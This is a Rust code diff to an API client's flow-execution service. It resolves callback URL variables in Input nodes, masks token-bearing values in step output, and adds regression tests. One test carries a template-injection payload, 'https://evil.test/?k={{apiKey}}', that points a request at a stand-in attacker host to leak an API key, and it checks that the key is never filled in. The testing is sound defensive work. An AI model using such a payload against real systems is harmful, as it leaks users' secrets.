@@ -1647,15 +1647,17 @@ impl FlowExecutionService {
         match &node.kind {
             FlowNodeKind::Input { value, .. } => {
                 // Resolve with the scope a request uses (global < collection <
-                // environment), so an If, Switch or Output sees the real value.
-                // An unknown `{{name}}` stays as literal text.
-                let vars = exec.build_variable_context(
+                // environment) and the callback URLs, so an If, Switch or Output
+                // sees the real value. A wire sends it as written, so this is the
+                // only pass. An unknown `{{name}}` stays as literal text.
+                let mut vars = exec.build_variable_context(
                     input.global_env_name.as_deref(),
                     Some(&input.collection),
                     input.environment_name.as_deref(),
                     None,
                     external_secrets,
                 );
+                vars.extend(callbacks.vars().clone());
                 let resolved = rocket_environment::resolve(value.data(), &vars).output;
                 // Wires get the raw value. The step shows it masked, then capped.
                 let (reported, cut) = mask_then_cap(&resolved, &trace_masks, STEP_VALUE_LIMIT);
@@ -8182,6 +8184,42 @@ mod tests {
     }
 
     #[tokio::test]
+    async fn an_input_value_resolves_the_callback_variable_before_it_is_wired() {
+        let flow = Flow {
+            name: "cb".to_string(),
+            nodes: vec![
+                input_node_with("in", "cb={{callback.payment}}"),
+                request_flow_node("b", "https://api.example.com/b"),
+                wait_node("w", "payment"),
+            ],
+            edges: vec![
+                FlowEdge {
+                    target_field: "body".to_string(),
+                    ..wire("e1", "in", "b")
+                },
+                trigger_edge("e2", "b", handle::RESULT, "w"),
+            ],
+            callback_host: None,
+        };
+        let fake = crate::test_doubles::FakeCallbackListener::new();
+        let executor = RecordingExecutor::new();
+        let exec = host_env_exec(&executor);
+
+        let summary = service_with_listener(flow, &fake)
+            .run(&exec, run_input("cb"))
+            .await
+            .expect("run");
+
+        assert_eq!(
+            executor.sent_bodies(),
+            vec![Some("cb=http://fake:1/cb/0".to_string())]
+        );
+        // The URL holds a bearer token, so the step shows it masked.
+        let shown = step_of(&summary, "in").value.clone().expect("value");
+        assert!(!shown.contains("fake:1/cb/0"), "{shown}");
+    }
+
+    #[tokio::test]
     async fn two_wait_nodes_get_their_own_urls() {
         let flow = Flow {
             name: "two".to_string(),
@@ -10473,6 +10511,72 @@ mod tests {
             executor.sent_urls().last().map(String::as_str),
             Some(attack)
         );
+    }
+
+    #[tokio::test]
+    async fn a_script_that_edits_a_wired_value_never_fills_it() {
+        let attack = "https://evil.test/?k={{apiKey}}";
+        let flow = Flow {
+            name: "wired".to_string(),
+            nodes: vec![
+                request_flow_node("a", "https://api.example.com/a"),
+                allow_wired_host(saved_flow_node("b", "req.yml")),
+            ],
+            edges: vec![
+                wire("e1", "a", "b"),
+                FlowEdge {
+                    target_field: "headers[X-Wired].value".to_string(),
+                    ..wire("e2", "a", "b")
+                },
+                FlowEdge {
+                    target_field: "body".to_string(),
+                    ..wire("e3", "a", "b")
+                },
+            ],
+            callback_host: None,
+        };
+        // The script names `apiKey` itself, so the name is one the script added.
+        let mut saved = Request::new("B", HttpMethod::Post, "https://api.example.com/b");
+        saved.pre_request_script = Some(
+            "req.setHeader('X-Sig', '{{apiKey}}');\
+             req.setUrl(req.getUrl() + '&ts=1');\
+             req.setHeader('X-Wired', req.getHeader('X-Wired') + '-x');\
+             req.setBody(req.getBody() + '-x');"
+                .into(),
+        );
+        let executor = RecordingExecutor::new();
+        executor.set_body("api.example.com/a", attack);
+        let exec = secret_var_exec(&executor);
+        let service = FlowExecutionService::new(
+            Box::new(FakeFlowRepository::new().with_flow("my-api", flow)),
+            Box::new(
+                FakeCollectionRepo::new()
+                    .with_request("my-api", "req.yml", saved)
+                    .build(),
+            ),
+            Box::new(NullEventPublisher),
+        );
+
+        let summary = service.run(&exec, run_input("wired")).await.expect("run");
+
+        let b = summary
+            .steps
+            .iter()
+            .find(|s| s.node_id == "b")
+            .expect("b ran");
+        assert_eq!(b.error, None);
+        let edited = format!("{attack}-x");
+        let header = |key: &str| {
+            executor.sent_headers()[1]
+                .iter()
+                .find(|h| h.key == key)
+                .map(|h| h.value.clone())
+        };
+        assert_eq!(executor.sent_urls()[1], format!("{attack}&ts=1"));
+        assert_eq!(header("X-Wired").as_deref(), Some(edited.as_str()));
+        assert_eq!(executor.sent_bodies()[1].as_deref(), Some(edited.as_str()));
+        // Text the script wrote into a field of its own still resolves.
+        assert_eq!(header("X-Sig").as_deref(), Some("k-123"));
     }
 
     #[tokio::test]
